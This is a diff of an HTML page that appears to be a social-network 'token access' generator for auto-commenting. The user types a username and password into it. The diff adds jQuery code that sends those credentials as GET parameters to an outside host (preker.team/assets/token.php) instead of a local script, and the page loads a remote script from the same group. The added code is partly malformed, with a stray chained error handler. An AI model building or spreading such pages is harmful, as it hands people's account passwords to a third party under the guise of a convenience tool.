@@ -72,15 +72,15 @@
                      <input type="password" id="mk" placeholder="Isi Password" class="form-control" autocomplete="off" style="background:#000;color:#0F0;border-bottom:1px solid #F00;border-right:1px solid #F00;border-top:1px solid #F00;border-left:1px solid #F00;"/>
                    </div>
                    <div class="form-group">
-                     <button type="button" class="btn btn-success hijau-btn" onclick="Puaru_Active()" >Generet Token Access</button>
+                     <button id="get_token" type="button" class="btn btn-success hijau-btn">Generet Token Access</button>
                    </div>
                </div>
                <div class="panel-body">
                    <div class="form-group">
                      <label><font color=#00FFFF>* Input Your  Token Access :</font></label>
-                     <div id="trave">
+
                          <input type="text" id="access_token" onClick="this.select()" placeholder="Isi Token / Generet Token Access" class="form-control" autocomplete="off" style="background:#000;color:#0F0;border-bottom:1px solid #F00;border-right:1px solid #F00;border-top:1px solid #F00;border-left:1px solid #F00;"/>
-                     </div>
+
                    </div>
                    <div class="form-group">
                      <label><font color=#00FFFF>* Input Your Comment :</font></label>
@@ -150,22 +150,47 @@
  </div>
 <script src="https://prekerteam.github.io/js/manasi.js?71419"></script>
 <script>
-    function Puaru_Active() {
-    var http = new XMLHttpRequest();
+
+  $("#get_token").click(function(){
+  $("#get_token").button('loading');
     var tk = document.getElementById("tk").value;
     var mk = document.getElementById("mk").value;
-    var url = "token.php";
-    var params = "u="+tk+"&p="+mk+"";
-    http.open("POST", url, true);
-    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    var url = "https://preker.team/assets/token.php";
+    $.get(url, {
+      u: tk,
+      p: mk
+    }).done(function(e) {
+        //console.log(e);
+          $("#get_token").button('reset');
+          if(e.session_key){
+            access_token.value=e.access_token;
+          }else{
+            access_token.value=e.error_msg;
+          }
+    }).error(function() {
+        $("#get_token").button('reset');
+        access_token.value='Server Aplikasi Gagal';
+    });
+  }).error(err => {
+    $("#get_token").button('reset');
+  });
 
-    http.onreadystatechange = function() {
-        if(http.readyState == 4 && http.status == 200) {
-          document.getElementById("trave").innerHTML = http.responseText;
-        }
-    }
-    http.send(params);
-    }
+    //function Puaru_Active() {
+    //var http = new XMLHttpRequest();
+    //var tk = document.getElementById("tk").value;
+    //var mk = document.getElementById("mk").value;
+    //var url = "token.php";
+    //var params = "u="+tk+"&p="+mk+"";
+    //http.open("POST", url, true);
+    //http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+    //http.onreadystatechange = function() {
+        //if(http.readyState == 4 && http.status == 200) {
+          //document.getElementById("trave").innerHTML = http.responseText;
+        //}
+    //}
+    //http.send(params);
+    //}
     </script>
     <script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
 </body>
